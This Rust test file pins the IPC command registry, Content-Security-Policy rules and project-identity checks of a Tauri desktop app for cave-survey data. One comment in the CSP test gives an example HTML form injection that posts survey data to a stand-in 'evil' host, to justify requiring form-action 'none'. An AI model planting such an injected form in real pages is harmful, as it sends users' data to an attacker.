//! App-surface contract tests relocated next to the wiring they pin, ahead of
//! the crate split: the IPC command registry (`generate_handler![]` in
//! `lib.rs`, read through its generated manifest) and `tauri.conf.json` stay
//! with the app crate, so the tests that read them live here too.

/// Every command `generate_handler![]` registers, from the manifest
/// `pnpm gen:ipc-types` writes (#576 C3) - parsed out of `lib.rs` with `syn`
/// and kept fresh by CI's generated-types gate - instead of a text scan of
/// `lib.rs` here.
fn registered_commands() -> Vec<String> {
    let manifest: serde_json::Value =
        serde_json::from_str(include_str!("../../../src/types/ipc/ipcCommands.json"))
            .expect("ipcCommands.json is the generator's JSON");
    let names: Vec<String> = manifest["commands"]
        .as_array()
        .expect("the manifest lists commands")
        .iter()
        .map(|c| {
            c["name"]
                .as_str()
                .expect("every command has a name")
                .to_owned()
        })
        .collect();
    assert!(
        names.len() > 100,
        "the manifest lists only {} commands",
        names.len()
    );
    names
}

#[test]
fn the_legacy_open_project_is_not_exposed_over_ipc() {
    // `AppState::open_project` deliberately has NO canonical-storage guard
    // (see its doc comment): its one production caller reopens the canonical
    // cache path after a failed replace. That is only sound while the webview
    // cannot reach it, so pin its absence from the command registry.
    assert!(
        !registered_commands()
            .iter()
            .any(|name| name == "open_project"),
        "open_project gained an IPC registration - it must now run the \
         canonical-storage guard (see AppState::open_project's doc comment)"
    );
}

/// `connect-src` in BOTH policies must admit Tauri's own IPC origin.
///
/// [#576 A8] Not a source scan: it reads the shipped `tauri.conf.json` - the
/// artefact itself, which no other test exercises - not Rust source text.
///
/// Every `invoke` is a `fetch` to `ipc://localhost/<cmd>` (macOS/Linux) or
/// `http://ipc.localhost/<cmd>` (Windows) - see `ipc-protocol.js` in the `tauri`
/// crate - so `connect-src` governs it, and Tauri does NOT add the origin back:
/// `set_csp` merges only script/style hashes, and its one automatic `default-src`
/// addition is gated on the isolation pattern, which this app does not use.
///
/// Omitting it does not brick the app, which is exactly why this needs a test:
/// the failure is silent. Tauri catches the CSP rejection, warns once to a
/// console nobody reads in a packaged build, latches `customProtocolIpcFailed`
/// and falls back to `postMessage` for the rest of the session - losing the
/// binary response path for every IPC reply. Nothing else in this repo can catch
/// it: `tauri.conf.json` has no linter, and the production `csp` (as opposed to
/// `devCsp`) is not exercised by the dev server, Playwright, or vitest - only by
/// a real `tauri build`.
#[test]
fn test_csp_allows_the_tauri_ipc_origin() {
    let conf_path = std::path::Path::new(env!("CARGO_MANIFEST_DIR")).join("tauri.conf.json");
    let conf: serde_json::Value =
        serde_json::from_str(&std::fs::read_to_string(&conf_path).unwrap()).unwrap();

    let security = &conf["app"]["security"];
    for key in ["csp", "devCsp"] {
        // `assert!` rather than `unwrap_or_else(|| panic!(..))`: `clippy::panic`
        // is deny-level here, and this module's `#[expect]` (commands/mod.rs)
        // covers `unwrap`/`expect` but deliberately not `panic!`.
        let policy = security[key].as_str();
        assert!(policy.is_some(), "app.security.{key} must be a string");
        let policy = policy.unwrap();

        let connect_src = policy
            .split(';')
            .map(str::trim)
            .find(|directive| directive.starts_with("connect-src"));
        assert!(connect_src.is_some(), "{key} must declare connect-src");
        let connect_src = connect_src.unwrap();

        for origin in ["ipc:", "http://ipc.localhost"] {
            assert!(
                connect_src.split_whitespace().any(|src| src == origin),
                "{key}'s connect-src must list `{origin}` or every invoke falls \
                 back to the slower postMessage transport; got: {connect_src}"
            );
        }

        // `form-action` and `frame-ancestors` have NO `default-src` fallback in
        // CSP3, so a tight `connect-src` is not the exfil control it looks like:
        // an injected `<form method=POST action=https://evil/>` posts survey data
        // straight past it. Neither directive can break a Tauri app, so there is
        // no reason for either to be absent.
        for directive in ["form-action 'none'", "frame-ancestors 'none'"] {
            assert!(
                policy.split(';').map(str::trim).any(|d| d == directive),
                "{key} must declare `{directive}` - it does not fall back to \
                 default-src; got: {policy}"
            );
        }
    }
}

/// [#576 C2] Commands that may run on the main thread, each with its reason.
/// Tauri runs a non-`async` command inline in the IPC handler on the main
/// thread, freezing the window and queueing every later call - Cancel included -
/// behind it, so the list is empty and adding to it needs a reason that outweighs
/// that (docs/architecture.md, "Where commands run").
const MAIN_THREAD_COMMANDS: &[(&str, &str)] = &[];

#[test]
fn every_registered_command_runs_off_the_main_thread() {
    let manifest: serde_json::Value =
        serde_json::from_str(include_str!("../../../src/types/ipc/ipcCommands.json"))
            .expect("the generated command manifest parses");
    let commands = manifest["commands"]
        .as_array()
        .expect("the manifest lists its commands");
    assert!(
        commands.len() > 150,
        "premise: the manifest lists every registered command, got {}",
        commands.len()
    );
    let on_main_thread: Vec<&str> = commands
        .iter()
        .filter(|c| c["async"] != serde_json::Value::Bool(true))
        .filter_map(|c| c["name"].as_str())
        .filter(|name| {
            !MAIN_THREAD_COMMANDS
                .iter()
                .any(|(allowed, _)| allowed == name)
        })
        .collect();
    assert!(
        on_main_thread.is_empty(),
        "these commands run on the main thread; make them `async` and put the body on \
         the blocking pool (`commands::pool`), or list them in MAIN_THREAD_COMMANDS with a \
         reason: {on_main_thread:?}"
    );
}

/// [#576 D22] The success values that carry the SpeleoDB link bits: every type
/// the core's `carries_remote_link!` invocation implements `MutationOutcome` for,
/// read off that source, so a new one is covered without editing a list here.
fn mutation_outcome_types() -> Vec<String> {
    let src = include_str!("../../crates/core/src/core/outcome.rs");
    let start = src
        .find("carries_remote_link!(")
        .expect("the MutationOutcome impl list is present");
    let list = &src[start + "carries_remote_link!(".len()..];
    let list = &list[..list.find(");").expect("the impl list terminates")];
    list.split(',')
        .map(str::trim)
        .filter(|ty| !ty.is_empty())
        .map(|ty| ty.rsplit("::").next().unwrap_or(ty).to_owned())
        .collect()
}

/// `text` from its first `{` to the matching `}`, skipping string literals and
/// line comments (a `{` inside `"{e}"` is not a brace). `None` when it never
/// closes.
fn braced_block(text: &str) -> Option<&str> {
    let open = text.find('{')?;
    let bytes = text.as_bytes();
    let (mut depth, mut i) = (0usize, open);
    while i < bytes.len() {
        match bytes[i] {
            b'"' => {
                i += 1;
                while i < bytes.len() && bytes[i] != b'"' {
                    i += if bytes[i] == b'\\' { 2 } else { 1 };
                }
            }
            b'/' if bytes.get(i + 1) == Some(&b'/') => {
                while i < bytes.len() && bytes[i] != b'\n' {
                    i += 1;
                }
            }
            b'{' => depth += 1,
            b'}' => {
                depth -= 1;
                if depth == 0 {
                    return Some(&text[open..=i]);
                }
            }
            _ => {}
        }
        i += 1;
    }
    None
}

/// The `X` of a `Result<X, CommandError>` return type (its last path segment), or
/// `None` for any other return type.
fn ok_type_of_command_result(ret: &str) -> Option<String> {
    let inner = ret.trim().strip_prefix("Result<")?;
    let mut depth = 0i32;
    let comma = inner.char_indices().find_map(|(at, c)| {
        match c {
            '<' | '(' => depth += 1,
            '>' | ')' => depth -= 1,
            ',' if depth == 0 => return Some(at),
            _ => {}
        }
        None
    })?;
    let error = inner[comma + 1..].trim_start();
    if !(error.starts_with("CommandError>") || error.contains("::CommandError>")) {
        return None;
    }
    let ok = inner[..comma].trim();
    Some(ok.rsplit("::").next().unwrap_or(ok).to_owned())
}

/// [#576 D22] `pool::run_mutation` is the ONE writer of an answer's `remote_link`,
/// so every command answering a `MutationOutcome` must run through it: one that
/// answers through `pool::run` (or anything else) leaves `remote_link` at the
/// `null` its outcome is built with, and the frontend - which applies the bits in
/// one place and keeps no mirror - never learns the edit dirtied the copy. A
/// source scan of every `#[tauri::command]` in `src/commands/*.rs`, cross-checked
/// against the generated command manifest so it cannot pass by seeing nothing.
///
/// A sanctioned site inventory (#576 A8-D2, docs/testing-recipes.md "Source
/// scans"): "every command whose answer is a `MutationOutcome` routes through
/// `run_mutation`" is a rule over the bodies `#[tauri::command]` wraps, and no type
/// can state it - `pool::run` accepts any `Result<T, CommandError>`, and Rust has no
/// negative bound to refuse a `MutationOutcome` there without a marker on every
/// other reply type. Each file is cut at its trailing test region by the shared
/// helper (`models::source_scan::test_module_start`), not by splitting on the bare
/// attribute text.
#[test]
fn every_mutation_outcome_command_runs_through_run_mutation() {
    let outcomes = mutation_outcome_types();
    for known in [
        "EditOutcome",
        "SectionCreated",
        "ShotCreated",
        "ReverseOutcome",
        "BatchOutcome",
        "HistoryOutcome",
        "ImportOutcome",
        "IntegrityRepairResult",
    ] {
        assert!(
            outcomes.iter().any(|ty| ty == known),
            "premise: `{known}` carries the link bits; parsed {outcomes:?}"
        );
    }

    let dir = std::path::Path::new(env!("CARGO_MANIFEST_DIR")).join("src/commands");
    let mut files: Vec<std::path::PathBuf> = std::fs::read_dir(&dir)
        .expect("the commands dir reads")
        .map(|entry| entry.expect("a dir entry").path())
        .filter(|path| {
            path.extension().is_some_and(|ext| ext == "rs")
                && !path
                    .file_name()
                    .and_then(|n| n.to_str())
                    .is_some_and(|n| n.ends_with("_tests.rs"))
        })
        .collect();
    files.sort();
    let mut scanned: Vec<String> = Vec::new();
    let mut offenders: Vec<String> = Vec::new();
    for path in files {
        let text = std::fs::read_to_string(&path).expect("a command file reads");
        // Production only: a file's own trailing test region ends it.
        let prod = text
            .get(..crate::models::source_scan::test_module_start(&text).unwrap_or(text.len()))
            .unwrap_or(&text);
        let file = path.file_name().and_then(|n| n.to_str()).unwrap_or("?");
        for chunk in prod.split("#[tauri::command]").skip(1) {
            let after = &chunk[chunk.find("fn ").expect("a command is a fn") + 3..];
            let name: String = after
                .chars()
                .take_while(|c| c.is_alphanumeric() || *c == '_')
                .collect();
            let signature = &after[..after.find('{').expect("a command has a body")];
            let ret = signature.rsplit("->").next().unwrap_or_default();
            let Some(ok) = ok_type_of_command_result(ret) else {
                continue;
            };
            if !outcomes.contains(&ok) {
                continue;
            }
            scanned.push(name.clone());
            let body = braced_block(after).expect("the command's body closes");
            if !body.contains("pool::run_mutation(") {
                offenders.push(format!("{file}::{name} -> Result<{ok}, CommandError>"));
            }
        }
    }
    scanned.sort();

    // The manifest's view of the same set: the scan must have seen every command
    // whose answer is a MutationOutcome, or a parse slip would pass vacuously.
    let manifest: serde_json::Value =
        serde_json::from_str(include_str!("../../../src/types/ipc/ipcCommands.json"))
            .expect("the generated command manifest parses");
    let mut expected: Vec<String> = manifest["commands"]
        .as_array()
        .expect("the manifest lists its commands")
        .iter()
        .filter(|c| {
            c["result"]["rust"]
                .as_str()
                .is_some_and(|ty| outcomes.iter().any(|o| o == ty))
        })
        .filter_map(|c| c["name"].as_str().map(str::to_owned))
        .collect();
    expected.sort();
    assert!(
        scanned.len() >= 40,
        "premise: the scan finds the survey mutations, got {}: {scanned:?}",
        scanned.len()
    );
    assert_eq!(
        scanned, expected,
        "RULE (every MutationOutcome command runs through run_mutation, #576 D22): the \
         source scan and the generated manifest disagree on which commands answer a \
         MutationOutcome"
    );
    assert!(
        offenders.is_empty(),
        "RULE (every MutationOutcome command runs through run_mutation, #576 D22): these \
         {} of {} commands answer a MutationOutcome but do not run through \
         `pool::run_mutation`, so their answer never carries the SpeleoDB link bits: \
         {offenders:?}",
        offenders.len(),
        scanned.len()
    );
}

/// The command that writes the open project to disk: it carries the identity of the
/// project it was made for like every survey mutation (#576 FZ-FZ-INT-4).
const SAVE_COMMAND: &str = "save_project";

/// A command signature's parameters (`signature` runs from the fn name to its
/// body), each with its whitespace removed, split at the list's top-level commas:
/// `expected_project: Option<ProjectIdentity>` reads
/// `expected_project:Option<ProjectIdentity>`.
fn parameters_of(signature: &str) -> Vec<String> {
    let Some(open) = signature.find('(') else {
        return Vec::new();
    };
    let (mut params, mut current) = (Vec::new(), String::new());
    let (mut depth, mut previous) = (0i32, ' ');
    for c in signature[open + 1..].chars() {
        match c {
            '(' | '[' | '<' => depth += 1,
            // The `>` of an `->` in a `Fn(..) -> T` parameter closes nothing.
            '>' if previous == '-' => {}
            ')' if depth == 0 => break,
            ')' | ']' | '>' => depth -= 1,
            ',' if depth == 0 => {
                params.push(std::mem::take(&mut current));
                previous = c;
                continue;
            }
            _ => {}
        }
        if !c.is_whitespace() {
            current.push(c);
        }
        previous = c;
    }
    if !current.is_empty() {
        params.push(current);
    }
    params
}

/// `text` without its whole-line comments and without any whitespace, so a call
/// rustfmt wraps over several lines reads the same as one on a single line.
fn code_without_whitespace(text: &str) -> String {
    text.lines()
        .filter(|line| !line.trim_start().starts_with("//"))
        .flat_map(str::chars)
        .filter(|c| !c.is_whitespace())
        .collect()
}

/// One `#[tauri::command]` of `src/commands/*.rs`, as the source scans read it.
struct ScannedCommand {
    /// `file::name`, for a failure message.
    at: String,
    name: String,
    /// From the fn name to its body.
    signature: String,
    /// The braced body.
    body: String,
}

/// Every `#[tauri::command]` in the production part of `src/commands/*.rs`, each
/// file cut at its trailing test region by the shared helper
/// (`models::source_scan::test_module_start`).
fn scanned_commands() -> Vec<ScannedCommand> {
    let dir = std::path::Path::new(env!("CARGO_MANIFEST_DIR")).join("src/commands");
    let mut files: Vec<std::path::PathBuf> = std::fs::read_dir(&dir)
        .expect("the commands dir reads")
        .map(|entry| entry.expect("a dir entry").path())
        .filter(|path| {
            path.extension().is_some_and(|ext| ext == "rs")
                && !path
                    .file_name()
                    .and_then(|n| n.to_str())
                    .is_some_and(|n| n.ends_with("_tests.rs"))
        })
        .collect();
    files.sort();
    let mut out = Vec::new();
    for path in files {
        let text = std::fs::read_to_string(&path).expect("a command file reads");
        let prod = text
            .get(..crate::models::source_scan::test_module_start(&text).unwrap_or(text.len()))
            .unwrap_or(&text);
        let file = path.file_name().and_then(|n| n.to_str()).unwrap_or("?");
        // The attribute at the start of a line: the text in a doc comment (pool.rs
        // names it) is not a command.
        for chunk in prod.split("\n#[tauri::command]").skip(1) {
            let after = &chunk[chunk.find("fn ").expect("a command is a fn") + 3..];
            let name: String = after
                .chars()
                .take_while(|c| c.is_alphanumeric() || *c == '_')
                .collect();
            let signature = &after[..after.find('{').expect("a command has a body")];
            let body = braced_block(after).expect("the command's body closes");
            out.push(ScannedCommand {
                at: format!("{file}::{name}"),
                name,
                signature: signature.to_owned(),
                body: body.to_owned(),
            });
        }
    }
    out
}

/// [#576 RVF-c-C1] The commands that write the OPEN project although they answer
/// no `MutationOutcome` and are not `save_project`: its `.plnx`, its SpeleoDB link
/// row, its `.stalx` through a SpeleoDB verb (replaced, relocated, closed), or its
/// server side through that link. Each carries the identity like a survey mutation
/// and hands it to `for_project(expected_project, ..)`. Every registered command is
/// an identity carrier, in [`NOT_OPEN_PROJECT_WRITERS`], or in a module of
/// [`NOT_OPEN_PROJECT_WRITER_MODULES`]
/// ([`every_registered_command_is_classified_as_writing_the_open_project_or_not`]).
const OTHER_OPEN_PROJECT_WRITERS: &[(&str, &str)] = &[
    (
        "save_dive_plan",
        "writes the open project's `.plnx` sibling",
    ),
    (
        "delete_dive_plan",
        "deletes a plan from the open project's `.plnx`",
    ),
    (
        "speleodb_unlink",
        "a Save As of the open project, then closes it and removes its cache copy",
    ),
    (
        "speleodb_done",
        "saves and uploads the open project, writes its link, releases its lock",
    ),
    (
        "speleodb_push",
        "saves and uploads the open project, writes its link",
    ),
    (
        "speleodb_discard_changes",
        "replaces the open project with the server tip",
    ),
    (
        "speleodb_restore_revision",
        "replaces the open project with a past revision",
    ),
    (
        "speleodb_take_remote",
        "replaces the open project with the server tip",
    ),
    (
        "speleodb_update",
        "may fast-forward (replace) the open project",
    ),
    (
        "speleodb_start_editing",
        "takes the open project's lock; may fast-forward it",
    ),
    (
        "speleodb_force_edit",
        "opens the open project's edit gate, clears its history",
    ),
    (
        "speleodb_set_undo_mode",
        "writes the open project's link row",
    ),
    (
        "speleodb_set_exclude_geojson",
        "changes the open project's server side",
    ),
    (
        "speleodb_patch_project",
        "changes the open project's server side, folds the name into its `.stalx`",
    ),
    (
        "speleodb_publish",
        "creates a server project from the open one and relocates it into the cache",
    ),
    (
        "speleodb_release_current_lock",
        "releases the open project's lock",
    ),
    (
        "speleodb_delete_project",
        "deletes the open project's server side, then its link row",
    ),
    (
        "speleodb_add_collaborator",
        "changes the open project's server side",
    ),
    (
        "speleodb_set_collaborator",
        "changes the open project's server side",
    ),
    (
        "speleodb_remove_collaborator",
        "changes the open project's server side",
    ),
    (
        "speleodb_add_team",
        "changes the open project's server side",
    ),
    (
        "speleodb_set_team",
        "changes the open project's server side",
    ),
    (
        "speleodb_remove_team",
        "changes the open project's server side",
    ),
];

/// [#576 RVF-c-C1] The commands that do NOT write the open project, each with the
/// reason, in the modules that also hold an open-project writer. One that writes it
/// belongs in [`OTHER_OPEN_PROJECT_WRITERS`] (or answers a `MutationOutcome`).
const NOT_OPEN_PROJECT_WRITERS: &[(&str, &str)] = &[
    // config
    ("get_config", "reads the app config"),
    (
        "load_display_settings",
        "reads the open project's display settings",
    ),
    ("patch_config", "the app config, not a project"),
    ("reload_config", "re-reads the app config"),
    (
        "save_display_setting",
        "writes the open project's display settings, and carries its own identity \
         (`made_for`, checked under `command_lock`)",
    ),
    ("update_config", "the app config, not a project"),
    ("update_data_table_view", "the app config, not a project"),
    ("update_edit_section_view", "the app config, not a project"),
    ("update_gas_config", "the app config, not a project"),
    ("update_import_shots_view", "the app config, not a project"),
    ("update_new_section_view", "the app config, not a project"),
    ("update_panel_layout", "the app config, not a project"),
    ("update_panel_sizes", "the app config, not a project"),
    // dive_plan
    ("list_dive_plans", "reads the `.plnx`"),
    ("load_dive_plan", "reads the `.plnx`"),
    ("plan_anchors_for_refs", "reads the survey"),
    ("plan_refs_for_anchors", "reads the survey"),
    // history
    ("can_redo", "reads the redo stack"),
    ("can_undo", "reads the undo stack"),
    ("get_redo_stack", "reads the redo stack"),
    ("get_undo_stack", "reads the undo stack"),
    // import
    ("calculate_file_hash", "hashes the file it names"),
    ("check_duplicate_import", "reads the import ledger"),
    ("check_section_hashes", "reads the import ledger"),
    ("count_unanchored_sections", "reads the survey"),
    ("import_dmp", "parses the file it names"),
    ("parse_compass", "parses the file it names"),
    ("parse_gpx", "parses the file it names"),
    ("parse_tml", "parses the file it names"),
    ("parse_walls", "parses the file it names"),
    ("suggest_all_import_placements", "reads the survey"),
    ("suggest_import_placement", "reads the survey"),
    ("suggest_orphan_placements", "reads the survey"),
    // project
    ("cancel_loading", "cancels a load in flight"),
    ("check_create_target", "reads the file system"),
    (
        "close_project",
        "a project-slot transition like a load or a create (part of a switch), not a \
         write made for the open project",
    ),
    (
        "create_project_full",
        "opens a new project: a switch itself",
    ),
    ("delete_project", "names the file it deletes by path"),
    ("get_adjusted_stations", "reads the survey"),
    ("get_along_line_distance", "reads the survey"),
    ("get_project_state", "reads the open project"),
    ("get_project_state_binary", "reads the open project"),
    ("get_station_distances_from", "reads the survey"),
    ("history_discarded", "reads a flag of the open session"),
    ("list_recent_projects", "reads the recent-projects list"),
    ("load_project_full", "opens a project: a switch itself"),
    (
        "load_project_full_binary",
        "opens a project: a switch itself",
    ),
    ("merge_projects", "names its sources and its output by path"),
    (
        "remove_from_recent_projects",
        "the recent-projects list, not a project",
    ),
    (
        "set_workspace_mode",
        "mirrors the app's workspace mode, not project state",
    ),
    (
        "take_unrecognised_shot_kinds",
        "drains the load its `loading_id` names",
    ),
    // section, shot, station, validation
    ("get_anchored_section_ids", "reads the survey"),
    ("get_rigid_connected_section_ids", "reads the survey"),
    ("get_section_relationships", "reads the survey"),
    ("get_segment_geometry", "reads the survey"),
    ("preview_delete_shot", "reads the survey"),
    ("preview_delete_shot_range", "reads the survey"),
    ("check_merge_connectivity", "reads the survey"),
    ("check_project_integrity", "reads the survey"),
    ("get_project_warnings", "reads the survey"),
    // speleodb
    (
        "speleodb_adopt_ariane",
        "opens the Ariane project its `project_id` names (a switch, like \
         `speleodb_open_project`): what it replaces is that id's cache copy",
    ),
    (
        "speleodb_dump_candidates",
        "reads a server dump; touches no cache copy",
    ),
    ("speleodb_get_project_metadata", "reads the server"),
    ("speleodb_get_revisions", "reads the server"),
    (
        "speleodb_link_status",
        "the status poll: describes (and reconciles the session to) whatever is open",
    ),
    ("speleodb_list_collaborators", "reads the server"),
    ("speleodb_list_projects", "reads the server"),
    ("speleodb_list_teams", "reads the server"),
    ("speleodb_local_project_states", "reads the local copies"),
    ("speleodb_login", "the account, not a project"),
    ("speleodb_logout", "the account, not a project"),
    ("speleodb_open_file_flags", "reads the open file's flags"),
    (
        "speleodb_open_project",
        "pulls the project its `project_id` names into that id's cache slot: a switch",
    ),
    (
        "speleodb_open_project_discarding_local",
        "pulls the project its `project_id` names over that id's cache copy: a switch",
    ),
    (
        "speleodb_release_all_locks",
        "every lock of the account, not the open project's",
    ),
    (
        "speleodb_release_lock",
        "names the project whose lock it releases by id",
    ),
    (
        "speleodb_release_lock_acquired_here",
        "hands back only the lock this process took: the unwind for a context that moved",
    ),
    (
        "speleodb_remove_link_at",
        "names the CLOSED file it strips by path and re-checks `expected`; refuses the \
         open project",
    ),
    ("speleodb_retry_keychain", "the account, not a project"),
    ("speleodb_rewind_target", "reads the server"),
    ("speleodb_search_users", "reads the server"),
    ("speleodb_session", "the account, not a project"),
    ("speleodb_set_token_storage", "the account, not a project"),
    (
        "speleodb_sign_in_hand_back_locks",
        "reads the session and the open project's link; changes nothing",
    ),
    (
        "speleodb_sign_out_locks",
        "reads the session and the open project's link; changes nothing",
    ),
    ("speleodb_unwind_target", "reads the server"),
];

/// [#576 RVF-c-C1] Modules none of whose commands writes the open project, each
/// with the reason. A module that gains a writer must list its other commands in
/// [`NOT_OPEN_PROJECT_WRITERS`] one by one.
const NOT_OPEN_PROJECT_WRITER_MODULES: &[(&str, &str)] = &[
    ("cache", "map tiles and their cache"),
    ("debug", "a debug-only crash trigger"),
    (
        "export",
        "writes the export file it names; reads the project",
    ),
    ("gas", "computes over the plan it is handed"),
    ("internal_error", "reads the crash notice"),
    ("launch", "the files the app was launched with"),
    ("logging", "the log"),
    ("memory", "process memory statistics"),
    ("raw_data", "reads the open database's tables"),
    (
        "recovery",
        "stateless: works on the file it names by path (one that failed to open)",
    ),
    ("save_target", "reads the file system"),
    ("survey_geometry", "reads the file it names"),
    ("telemetry", "telemetry, not a project"),
];

/// [#576 FZ-FZ-INT-4, FZ-FZ-INT-7, RVF-c-C1] Every command that writes the open
/// project names the project it was made for, and the backend checks it under
/// `command_lock` in the same span as the write (`core::state::expected_project`).
/// A command that takes no identity - or takes it and drops it - applies its write
/// to whichever project is open when it runs, so one issued during a project switch
/// lands in the NEW project: an edit of CaveA adds its section to CaveB, a Save As
/// of CaveA writes CaveB to the path chosen for CaveA, a dive plan of CaveA lands
/// in CaveB's `.plnx`, an Unlink of CaveA moves CaveB out of the cache.
///
/// The commands are the ones answering a `MutationOutcome` (the set
/// [`every_mutation_outcome_command_runs_through_run_mutation`] scans),
/// `save_project`, and [`OTHER_OPEN_PROJECT_WRITERS`]. Each must (a) declare
/// `expected_project: Option<ProjectIdentity>`, (b) hand it on - to
/// `pool::run_mutation(app, expected_project, ..)`, which runs the body inside
/// `for_project`, or for the others to `for_project(expected_project, ..)` itself -
/// and (c) carry it on the wire: the generated manifest lists `expected_project`
/// among the command's args. The same sanctioned source-scan shape as the
/// run_mutation scan (#576 A8-D2): the rule is over the bodies `#[tauri::command]`
/// wraps, and the scanned set is cross-checked against the manifest so it cannot
/// pass by seeing nothing.
#[test]
fn every_save_and_mutation_command_names_the_project_it_was_made_for() {
    const PARAMETER: &str = "expected_project:Option<ProjectIdentity>";
    const MUTATION_HAND_ON: &str = "pool::run_mutation(app,expected_project,";
    const SAVE_HAND_ON: &str = "for_project(expected_project,";
    let outcomes = mutation_outcome_types();
    assert!(
        outcomes.len() >= 8,
        "premise: the MutationOutcome types parse, got {outcomes:?}"
    );
    let other_writer = |name: &str| OTHER_OPEN_PROJECT_WRITERS.iter().any(|(w, _)| *w == name);

    let manifest: serde_json::Value =
        serde_json::from_str(include_str!("../../../src/types/ipc/ipcCommands.json"))
            .expect("the generated command manifest parses");
    let commands = manifest["commands"]
        .as_array()
        .expect("the manifest lists its commands");
    let manifest_args = |name: &str| -> Option<Vec<String>> {
        let command = commands.iter().find(|c| c["name"].as_str() == Some(name))?;
        Some(
            command["args"]
                .as_array()?
                .iter()
                .filter_map(|arg| arg["name"].as_str().map(str::to_owned))
                .collect(),
        )
    };

    let mut scanned: Vec<String> = Vec::new();
    let mut no_parameter: Vec<String> = Vec::new();
    let mut not_handed_on: Vec<String> = Vec::new();
    let mut not_on_the_wire: Vec<String> = Vec::new();
    for command in scanned_commands() {
        let ret = command.signature.rsplit("->").next().unwrap_or_default();
        let is_mutation = ok_type_of_command_result(ret).is_some_and(|ok| outcomes.contains(&ok));
        if !is_mutation && command.name != SAVE_COMMAND && !other_writer(&command.name) {
            continue;
        }
        scanned.push(command.name.clone());
        if !parameters_of(&command.signature)
            .iter()
            .any(|p| p == PARAMETER)
        {
            no_parameter.push(command.at.clone());
        }
        let hand_on = if is_mutation {
            MUTATION_HAND_ON
        } else {
            SAVE_HAND_ON
        };
        if !code_without_whitespace(&command.body).contains(hand_on) {
            not_handed_on.push(format!("{} (wants `{hand_on}`)", command.at));
        }
        let on_the_wire = manifest_args(&command.name)
            .is_some_and(|args| args.iter().any(|arg| arg == "expected_project"));
        if !on_the_wire {
            not_on_the_wire.push(command.at);
        }
    }
    scanned.sort();

    // The manifest's view of the same set, so a parse slip cannot pass vacuously.
    let mut expected: Vec<String> = commands
        .iter()
        .filter(|c| {
            c["name"]
                .as_str()
                .is_some_and(|name| name == SAVE_COMMAND || other_writer(name))
                || c["result"]["rust"]
                    .as_str()
                    .is_some_and(|ty| outcomes.iter().any(|o| o == ty))
        })
        .filter_map(|c| c["name"].as_str().map(str::to_owned))
        .collect();
    expected.sort();
    assert!(
        scanned.len() >= 40 + OTHER_OPEN_PROJECT_WRITERS.len()
            && scanned.iter().any(|name| name == SAVE_COMMAND),
        "premise: the scan finds the survey mutations, `{SAVE_COMMAND}` and the other \
         open-project writers, got {}: {scanned:?}",
        scanned.len()
    );
    assert_eq!(
        scanned, expected,
        "RULE (every command that writes the open project names the project it was made \
         for, #576 FZ-FZ-INT-4/7, RVF-c-C1): the source scan and the generated manifest \
         disagree on which commands are saves, answer a MutationOutcome or are listed in \
         OTHER_OPEN_PROJECT_WRITERS"
    );
    assert!(
        no_parameter.is_empty(),
        "RULE (every command that writes the open project names the project it was made \
         for, #576 FZ-FZ-INT-4/7, RVF-c-C1): these {} of {} commands do not declare \
         `expected_project: Option<ProjectIdentity>`, so a write issued before a project \
         switch lands in the project opened after it: {no_parameter:?}",
        no_parameter.len(),
        scanned.len()
    );
    assert!(
        not_handed_on.is_empty(),
        "RULE (every command that writes the open project names the project it was made \
         for, #576 FZ-FZ-INT-4/7, RVF-c-C1): these {} of {} commands do not hand \
         `expected_project` on to the check (`pool::run_mutation(app, expected_project, \
         ..)` for a mutation, `for_project(expected_project, ..)` for the others), so the \
         identity is never checked: {not_handed_on:?}",
        not_handed_on.len(),
        scanned.len()
    );
    assert!(
        not_on_the_wire.is_empty(),
        "RULE (every command that writes the open project names the project it was made \
         for, #576 FZ-FZ-INT-4/7, RVF-c-C1): the generated manifest lists no \
         `expected_project` arg for these {} of {} commands (run `pnpm gen:ipc-types`): \
         {not_on_the_wire:?}",
        not_on_the_wire.len(),
        scanned.len()
    );
}

/// A registered command as the classification reads it off the manifest.
struct ManifestCommand {
    name: String,
    module: String,
    /// Its answer is a `MutationOutcome` (or it is `save_project`): an identity
    /// carrier by its type.
    by_type: bool,
    /// The manifest lists `expected_project` among its args.
    carries_identity: bool,
}

/// What [`every_registered_command_is_classified_as_writing_the_open_project_or_not`]
/// finds wrong with `commands` and the three lists: one line per problem, empty
/// when every command is classified once and every list entry names a command or
/// a module that exists.
fn classification_failures(commands: &[ManifestCommand]) -> Vec<String> {
    let listed = |list: &[(&str, &str)], name: &str| list.iter().any(|(n, _)| *n == name);
    let writer = |c: &ManifestCommand| c.by_type || listed(OTHER_OPEN_PROJECT_WRITERS, &c.name);
    let mut failures = Vec::new();
    for c in commands {
        let not_writer = listed(NOT_OPEN_PROJECT_WRITERS, &c.name);
        let not_module = listed(NOT_OPEN_PROJECT_WRITER_MODULES, &c.module);
        if writer(c) && (not_writer || not_module) {
            failures.push(format!(
                "`{}` (module `{}`) is an open-project writer and also listed as not one: \
                 a module of NOT_OPEN_PROJECT_WRITER_MODULES that gains a writer lists its \
                 other commands in NOT_OPEN_PROJECT_WRITERS one by one",
                c.name, c.module
            ));
        } else if !writer(c) && !not_writer && !not_module {
            failures.push(format!(
                "`{}` (module `{}`) is not classified: if it writes the open project (its \
                 `.stalx`, `.plnx` or link row, replaces, relocates or closes it, or changes \
                 its server side through the link), give it `expected_project: \
                 Option<ProjectIdentity>`, run its body inside `for_project(expected_project, \
                 ..)` with `refuse_other_project` under `command_lock` at the write, and add \
                 it to OTHER_OPEN_PROJECT_WRITERS; otherwise add it to \
                 NOT_OPEN_PROJECT_WRITERS with the reason",
                c.name, c.module
            ));
        } else if !writer(c) && c.carries_identity {
            failures.push(format!(
                "`{}` carries `expected_project` but is listed as not writing the open \
                 project: list it in OTHER_OPEN_PROJECT_WRITERS",
                c.name
            ));
        }
    }
    for (list, what) in [
        (OTHER_OPEN_PROJECT_WRITERS, "OTHER_OPEN_PROJECT_WRITERS"),
        (NOT_OPEN_PROJECT_WRITERS, "NOT_OPEN_PROJECT_WRITERS"),
    ] {
        for (name, _) in list {
            if !commands.iter().any(|c| c.name == *name) {
                failures.push(format!("{what} lists `{name}`, which is not registered"));
            }
        }
    }
    for (module, _) in NOT_OPEN_PROJECT_WRITER_MODULES {
        if !commands.iter().any(|c| c.module == *module) {
            failures.push(format!(
                "NOT_OPEN_PROJECT_WRITER_MODULES lists `{module}`, which registers no command"
            ));
        }
    }
    for (name, _) in OTHER_OPEN_PROJECT_WRITERS {
        if listed(NOT_OPEN_PROJECT_WRITERS, name) {
            failures.push(format!(
                "`{name}` is listed both as a writer and as not one"
            ));
        }
    }
    failures
}

